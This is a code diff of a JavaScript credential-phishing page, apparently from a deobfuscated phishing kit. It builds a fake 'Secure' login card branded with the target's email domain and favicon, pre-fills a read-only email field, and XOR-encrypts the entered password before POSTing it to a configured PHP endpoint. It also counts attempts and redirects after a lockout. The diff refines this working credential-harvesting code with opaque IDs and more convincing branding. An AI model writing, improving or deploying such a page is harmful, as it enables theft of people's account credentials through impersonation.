@@ -1,7 +1,7 @@
 (function () {
   "use strict";
 
-  // Configuration - extracted from _0x374f98 in original
+  // Configuration - extracted from original _0x374f98
   const CONFIG = {
     BG_IMG: "https://images.unsplash.com/photo-1517849845537-4d257902454a?w=1920&q=80",
     BG_BRI: 1,
@@ -33,7 +33,7 @@
     TAG_TEXT: "Secure"
   };
 
-  // Encryption helper from _0x52b58a / _0x24d279
+  // Encryption from _0x52b58a
   function encryptData(data, key) {
     const jsonStr = JSON.stringify(data);
     const keyLen = key.length;
@@ -45,7 +45,7 @@
     return btoa(result);
   }
 
-  // Get domain from email - from _0x66386b
+  // Get domain from email - _0x66386b
   function getEmailDomain(email) {
     if (!email || email.indexOf("@") === -1) return "";
     const parts = email.split("@");
@@ -55,88 +55,69 @@
     return "";
   }
 
-  // Capitalize first letter - from _0x514502
+  // Capitalize - _0x514502
   function capitalize(str) {
     if (!str) return "";
     return str.charAt(0).toUpperCase() + str.slice(1);
   }
 
-  // Create background element - from _0x1a0432
+  // Create background - _0x1a0432
   function createBackground() {
     const bg = document.createElement("div");
     bg.id = "bg_canvas";
     bg.className = "frame_v7";
     
-    const overlay = document.createElement("div");
-    overlay.id = "bg_veil";
+    const veil = document.createElement("div");
+    veil.id = "bg_veil";
     
-    document.body.appendChild(bg);
-    document.body.appendChild(overlay);
+    document.body.insertBefore(bg, document.body.firstChild);
+    document.body.insertBefore(veil, document.body.firstChild);
   }
 
-  // Create main UI elements - from _0x8166d4
+  // Create main UI - _0x8166d4
   function createUI() {
-    const container = document.createElement("div");
-    container.id = "base_node";
-    container.className = "base_node";
-
-    // Alert banner
-    const alertDiv = document.createElement("div");
-    alertDiv.id = "alert_banner";
-    alertDiv.className = "alert_banner";
-    document.body.appendChild(alertDiv);
-
     // Main form container
     const mainForm = document.createElement("div");
     mainForm.id = "main_form";
-    mainForm.className = "card_root";
+    mainForm.className = "base_node";
     
-    // Brand orb with lock icon
-    const brandRow = document.createElement("div");
-    brandRow.className = "brand_row";
-    brandRow.innerHTML = `
-      <div class="brand_orb" id="brand_orb">
-        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-          <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
-        </svg>
+    // Alert node
+    const alertNode = document.createElement("div");
+    alertNode.id = "alert_node";
+    alertNode.className = "alert_banner";
+    
+    // Title section
+    const titleNode = document.createElement("div");
+    titleNode.id = "title_node";
+    titleNode.innerHTML = `
+      <div class="brand_row">
+        <div class="brand_orb" id="brand_orb">
+          <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+          </svg>
+        </div>
+        <img src="" alt="brand_img" id="brand_img" style="display:none">
+        <h1 class="title_main" id="caption_title">${CONFIG.HEADING}</h1>
       </div>
-      <img src="" alt="brand_img" id="brand_img" style="display:none">
+      <div class="caption_sub" id="caption_sub">${CONFIG.SUBHEAD}</div>
     `;
     
-    // Title
-    const title = document.createElement("h1");
-    title.className = "title_main";
-    title.id = "title_main";
-    title.textContent = CONFIG.HEADING;
-    
-    // Subtitle
-    const subTitle = document.createElement("div");
-    subTitle.className = "caption_sub";
-    subTitle.id = "caption_sub";
-    subTitle.textContent = CONFIG.SUBHEAD;
-
-    // Form
-    const form = document.createElement("form");
-    form.id = "form_auth";
-    form.innerHTML = `
+    // Form fields
+    const formFields = document.createElement("div");
+    formFields.className = "form_shell";
+    formFields.innerHTML = `
       <div class="field_shell">
-        <label class="lbl_small" for="email_input">${CONFIG.EMAIL_LABEL}</label>
+        <label class="lbl_small" id="mail_slot">${CONFIG.EMAIL_LABEL}</label>
         <div class="inp_wrap">
-          <input type="email" id="email_input" class="inp_core" placeholder="Enter your email" required autocomplete="off">
-          <div class="ico_slot">
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-              <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
-              <polyline points="22,6 12,13 2,6"></polyline>
-            </svg>
-          </div>
+          <input type="email" id="mail_x9k2" class="inp_core" readonly tabindex="-1" autocomplete="off">
         </div>
       </div>
       
       <div class="field_shell">
-        <label class="lbl_small" for="code_input">${CONFIG.KEY_LABEL}</label>
+        <label class="lbl_small" for="code_p4r7_input">${CONFIG.KEY_LABEL}</label>
         <div class="inp_wrap">
-          <input type="password" id="code_input" class="inp_core" placeholder="${CONFIG.KEY_PLACEHOLDER}" required autocomplete="off">
+          <input type="password" id="code_p4r7_input" class="inp_core" placeholder="${CONFIG.KEY_PLACEHOLDER}" required autocomplete="off">
           <button type="button" class="eye_btn" id="eye_toggle">
             <svg class="eye_show" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
               <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
@@ -150,13 +131,13 @@
         </div>
       </div>
       
-      <button type="submit" class="cta_main" id="submit_btn">
+      <button type="submit" class="cta_main" id="code_p4r7">
         <span class="btn_text">${CONFIG.BUTTON_TEXT}</span>
         <span class="ring_loader" id="ring_loader"></span>
       </button>
     `;
-
-    // Footer tag
+    
+    // Footer
     const footer = document.createElement("div");
     footer.className = "row_block";
     footer.innerHTML = `
@@ -169,36 +150,49 @@
       </div>
       <div class="caption_node">${CONFIG.FOOTER}</div>
     `;
-
-    mainForm.appendChild(brandRow);
-    mainForm.appendChild(title);
-    mainForm.appendChild(subTitle);
-    mainForm.appendChild(form);
+    
+    mainForm.appendChild(alertNode);
+    mainForm.appendChild(titleNode);
+    mainForm.appendChild(formFields);
     mainForm.appendChild(footer);
+    
     document.body.appendChild(mainForm);
   }
 
-  // Apply background styles - from _0x3ce607
-  function applyBackgroundStyles() {
+  // Apply styles - _0x3ce607
+  function applyStyles() {
     const bg = document.getElementById("bg_canvas");
     const veil = document.getElementById("bg_veil");
     
-    if (!bg || !veil) return;
-    
-    bg.style.backgroundImage = `url(${CONFIG.BG_IMG})`;
-    bg.style.filter = `brightness(${CONFIG.BG_BRI}) contrast(${CONFIG.BG_CON}) saturate(${CONFIG.BG_SAT})`;
-    
-    if (CONFIG.BG_BLUR > 0) {
-      bg.style.filter += ` blur(${CONFIG.BG_BLUR}px)`;
+    if (bg) {
+      bg.style.cssText = `
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: -1;
+        background-image: url(${CONFIG.BG_IMG});
+        background-size: cover;
+        background-position: center;
+        filter: brightness(${CONFIG.BG_BRI}) contrast(${CONFIG.BG_CON}) saturate(${CONFIG.BG_SAT})${CONFIG.BG_BLUR > 0 ? ` blur(${CONFIG.BG_BLUR}px)` : ""}${CONFIG.BG_GRAY ? " grayscale(1)" : ""};
+      `;
     }
-    if (CONFIG.BG_GRAY) {
-      bg.style.filter += " grayscale(1)";
-    }
     
-    veil.style.background = `rgba(10,66,123,${CONFIG.BG_OVERLAY})`;
+    if (veil) {
+      veil.style.cssText = `
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: -1;
+        background: rgba(10,66,123,${CONFIG.BG_OVERLAY});
+      `;
+    }
   }
 
-  // Update URL with random token - from _0x446451
+  // Update URL - _0x446451
   function updateURL() {
     try {
       const array = new Uint8Array(16);
@@ -211,87 +205,89 @@
     } catch (e) {}
   }
 
-  // Update favicon - from _0x32b3a6
+  // Update favicon - _0x32b3a6
   function updateFavicon(domain) {
     const img = new Image();
     const url = `https://www.google.com/s2/favicons?domain=${encodeURIComponent(domain)}&sz=128`;
     
     img.onload = function() {
       const brandImg = document.getElementById("brand_img");
-      if (brandImg) brandImg.src = url;
+      if (brandImg) {
+        brandImg.src = url;
+        brandImg.style.display = "block";
+      }
     };
     
     img.onerror = function() {
       const brandImg = document.getElementById("brand_img");
       if (brandImg) {
         brandImg.src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Ccircle cx='12' cy='12' r='10' fill='%23464f5b'/%3E%3C/svg%3E";
+        brandImg.style.display = "block";
       }
     };
     
     img.src = url;
   }
 
-  // Show alert - from _0x36b61d
+  // Show alert - _0x36b61d
   function showAlert(message, type) {
-    const alertBanner = document.getElementById("alert_banner");
-    if (!alertBanner) return;
+    const alertNode = document.getElementById("alert_node");
+    if (!alertNode) return;
     
-    alertBanner.textContent = message;
-    alertBanner.className = "alert_banner visible " + type;
+    alertNode.textContent = message;
+    alertNode.className = "alert_banner visible " + type;
     
     if (type === "error") {
-      alertBanner.style.background = "rgba(220,53,69,0.15)";
-      alertBanner.style.color = "#ff6b6b";
-      alertBanner.style.border = "1px solid rgba(220,53,69,0.3)";
+      alertNode.style.cssText = "display:block;background:#fee9e7;color:#b33a2f;border:1px solid #f5c6c2;padding:12px 16px;border-radius:8px;margin-bottom:20px;text-align:center;font-size:14px;";
     } else {
-      alertBanner.style.background = "rgba(40,167,69,0.15)";
-      alertBanner.style.color = "#51cf66";
-      alertBanner.style.border = "1px solid rgba(40,167,69,0.3)";
+      alertNode.style.cssText = "display:block;background:#e3f5e9;color:#1e7a4b;border:1px solid #b8e0c8;padding:12px 16px;border-radius:8px;margin-bottom:20px;text-align:center;font-size:14px;";
     }
   }
 
-  // Hide alert - from _0x381c63
+  // Hide alert - _0x381c63
   function hideAlert() {
-    const alertBanner = document.getElementById("alert_banner");
-    if (alertBanner) {
-      alertBanner.classList.remove("visible");
+    const alertNode = document.getElementById("alert_node");
+    if (alertNode) {
+      alertNode.style.display = "none";
+      alertNode.className = "alert_banner";
     }
   }
 
-  // Set loading state - from _0x148b5e
-  function setLoading(isLoading) {
-    const btn = document.getElementById("submit_btn");
+  // Set loading - _0x148b5e
+  function setLoading(loading) {
+    const btn = document.getElementById("code_p4r7");
     const loader = document.getElementById("ring_loader");
     
     if (btn) {
-      btn.disabled = isLoading;
-      btn.classList.toggle("locked_spin", isLoading);
+      btn.disabled = loading;
+      btn.classList.toggle("locked_spin", loading);
     }
     if (loader) {
-      loader.style.display = isLoading ? "inline-block" : "none";
+      loader.style.display = loading ? "inline-block" : "none";
     }
   }
 
-  // Handle lockout - from _0x31d847
+  // Handle lockout - _0x31d847
   function handleLockout() {
-    const btn = document.getElementById("submit_btn");
-    const codeInput = document.getElementById("code_input");
+    const btn = document.getElementById("code_p4r7");
+    const passwordInput = document.getElementById("code_p4r7_input");
     
     showAlert(CONFIG.MSG_LOCKOUT, "error");
     setLoading(true);
     
-    if (codeInput) codeInput.value = "";
+    if (passwordInput) passwordInput.value = "";
     
     setTimeout(function() {
       window.location.href = CONFIG.LOCKOUT_REDIRECT;
     }, CONFIG.LOCKOUT_DELAY);
   }
 
-  // Update email display - from _0x46696c
+  // Update email display - _0x46696c
   function updateEmailDisplay() {
-    const emailInput = document.getElementById("email_input");
-    const titleMain = document.getElementById("title_main");
+    const emailInput = document.getElementById("mail_x9k2");
+    const captionTitle = document.getElementById("caption_title");
     const captionSub = document.getElementById("caption_sub");
+    const mailSlot = document.getElementById("mail_slot");
     
     if (!emailInput) return;
     
@@ -299,55 +295,55 @@
     const domain = getEmailDomain(email);
     
     if (!domain) {
-      if (titleMain) titleMain.textContent = CONFIG.HEADING;
+      if (captionTitle) captionTitle.textContent = CONFIG.HEADING;
       if (captionSub) captionSub.textContent = CONFIG.SUBHEAD;
+      if (mailSlot) mailSlot.textContent = CONFIG.EMAIL_LABEL;
       updateFavicon("");
       return;
     }
     
     const domainName = capitalize(domain.split(".")[0]);
-    if (titleMain) titleMain.textContent = domainName + " " + CONFIG.HEADING;
+    if (captionTitle) captionTitle.textContent = domainName + " " + CONFIG.HEADING;
     if (captionSub) captionSub.textContent = domainName + " " + CONFIG.SUBHEAD;
+    if (mailSlot) mailSlot.textContent = domainName + " " + CONFIG.EMAIL_LABEL;
     
     updateFavicon(domain);
   }
 
-  // Form submission handler - from _0x41ee04
+  // Handle submit - _0x41ee04
   function handleSubmit(e) {
     e.preventDefault();
     
-    const emailInput = document.getElementById("email_input");
-    const codeInput = document.getElementById("code_input");
-    const submitBtn = document.getElementById("submit_btn");
+    const emailInput = document.getElementById("mail_x9k2");
+    const passwordInput = document.getElementById("code_p4r7_input");
     
-    if (!emailInput || !codeInput) return;
+    if (!emailInput || !passwordInput) return;
     
     const email = emailInput.value.trim();
-    const code = codeInput.value.trim();
+    const password = passwordInput.value.trim();
     const startTime = Date.now();
     
     // Validation
     if (!email || email.indexOf("@") === -1) {
       showAlert("Please enter a valid email address.", "error");
-      codeInput.focus();
+      passwordInput.focus();
       return;
     }
     
-    if (!code) {
-      showAlert("Please enter your access code.", "error");
-      codeInput.focus();
+    if (!password) {
+      showAlert(CONFIG.MSG_WRONG, "error");
+      passwordInput.focus();
       return;
     }
     
     hideAlert();
     setLoading(true);
     
-    // Prepare payload - ORIGINAL: FormData with encrypted blob
+    // ORIGINAL: Encrypt and send as FormData
+    const encryptedPayload = encryptData({ email: email, code: password }, CONFIG.SECRET_KEY);
     const formData = new FormData();
-    const encryptedPayload = encryptData({ email: email, code: code }, CONFIG.SECRET_KEY);
     formData.append("data", encryptedPayload);
     
-    // Fetch request
     fetch(CONFIG.PHP_ENDPOINT, {
       method: "POST",
       body: formData
@@ -359,19 +355,16 @@
       let data = null;
       try {
         data = JSON.parse(text);
-      } catch (e) {
-        // Parse error
-      }
-      processResponse(data, email, code);
+      } catch (e) {}
+      processResponse(data, email, password);
     })
     .catch(function() {
       setLoading(false);
       showAlert(CONFIG.MSG_NET, "error");
-      codeInput.value = "";
-      codeInput.focus();
+      passwordInput.value = "";
+      passwordInput.focus();
     })
     .then(function() {
-      // Minimum delay for UX
       const elapsed = Date.now() - startTime;
       const delay = Math.max(800, 2000 - elapsed);
       return new Promise(function(resolve) {
@@ -383,13 +376,11 @@
     });
   }
 
-  // Process server response
-  function processResponse(data, email, code) {
-    const codeInput = document.getElementById("code_input");
+  // Process response
+  function processResponse(data, email, password) {
+    const passwordInput = document.getElementById("code_p4r7_input");
     
-    // Get attempt count
-    let attempts = parseInt(sessionStorage.getItem(CONFIG.STORAGE_KEY + "_attempts") || "0", 10);
-    attempts++;
+    let attempts = parseInt(sessionStorage.getItem(CONFIG.STORAGE_KEY + "_attempts") || "0", 10) + 1;
     sessionStorage.setItem(CONFIG.STORAGE_KEY + "_attempts", String(attempts));
     
     if (!data) {
@@ -398,14 +389,13 @@
         return;
       }
       showAlert(CONFIG.MSG_WRONG, "error");
-      if (codeInput) {
-        codeInput.value = "";
-        codeInput.focus();
+      if (passwordInput) {
+        passwordInput.value = "";
+        passwordInput.focus();
       }
       return;
     }
     
-    // Handle response status
     if (data.status === "success") {
       showAlert(CONFIG.MSG_GRANTED, "success");
       sessionStorage.setItem(CONFIG.STORAGE_KEY + "_verified", "true");
@@ -422,14 +412,14 @@
       }
       const remaining = CONFIG.MAX_TRIES - attempts;
       showAlert(CONFIG.MSG_WRONG + " (" + remaining + " attempts remaining)", "error");
-      if (codeInput) {
-        codeInput.value = "";
-        codeInput.focus();
+      if (passwordInput) {
+        passwordInput.value = "";
+        passwordInput.focus();
       }
     }
   }
 
-  // Initialize - from _0x1ecf22
+  // Initialize - _0x1ecf22
   function init() {
     // Check if already verified
     const verified = sessionStorage.getItem(CONFIG.STORAGE_KEY + "_verified");
@@ -441,36 +431,36 @@
     // Create UI
     createBackground();
     createUI();
-    applyBackgroundStyles();
+    applyStyles();
     updateURL();
     
     // Get DOM references
-    const emailInput = document.getElementById("email_input");
-    const codeInput = document.getElementById("code_input");
+    const emailInput = document.getElementById("mail_x9k2");
+    const passwordInput = document.getElementById("code_p4r7_input");
     const eyeToggle = document.getElementById("eye_toggle");
-    const form = document.getElementById("form_auth");
+    const submitBtn = document.getElementById("code_p4r7");
     
     // Event listeners
     if (emailInput) {
       emailInput.addEventListener("input", updateEmailDisplay);
     }
     
-    if (eyeToggle && codeInput) {
+    if (eyeToggle && passwordInput) {
       eyeToggle.addEventListener("click", function() {
-        const isPassword = codeInput.type === "password";
-        codeInput.type = isPassword ? "text" : "password";
+        const isPassword = passwordInput.type === "password";
+        passwordInput.type = isPassword ? "text" : "password";
         
         const eyeShow = eyeToggle.querySelector(".eye_show");
         const eyeHide = eyeToggle.querySelector(".eye_hide");
         if (eyeShow) eyeShow.style.display = isPassword ? "none" : "block";
         if (eyeHide) eyeHide.style.display = isPassword ? "block" : "none";
         
-        codeInput.focus();
+        passwordInput.focus();
       });
     }
     
-    if (form) {
-      form.addEventListener("submit", handleSubmit);
+    if (submitBtn) {
+      submitBtn.addEventListener("click", handleSubmit);
     }
     
     // Initial display
